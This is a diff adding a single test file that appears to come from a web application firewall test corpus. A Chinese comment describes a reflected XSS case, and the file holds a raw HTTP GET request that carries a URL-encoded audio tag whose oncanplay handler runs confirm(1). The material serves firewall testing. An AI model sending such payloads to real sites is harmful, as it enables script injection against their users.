@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_audio标签_oncanplay事件-06506515
+# 攻击者注入了一个 HTML 音频标签，其中包含一个源标签，指向一个名为"validaudio.wav"的音频文件。但是，攻击者通过在"oncanplay"属性中注入恶意代码，使得当浏览器尝试播放音频文件时，会执行确认框的脚本，其内容为"confirm(1)"，这将返回一个布尔值，如果用户点击了确认按钮，则该值将为 true，从而执行攻击者的代码。如果资源可以播放则触发。
+GET /?id=%3Caudio%20oncanplay=confirm%281%29%3E%3Csource%20src=%22validaudio.wav%22%20type=%22audio%2Fwav%22%3E%3C%2Faudio%3E&bid=hd_tag_m8mv26cv HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26cv
+RM-PRO-Token: 93c2d07b85311207a468b56e78a6ed63
+RM-PRO-Time: 1742808582207
+User-Agent: curl/7.83.1
+
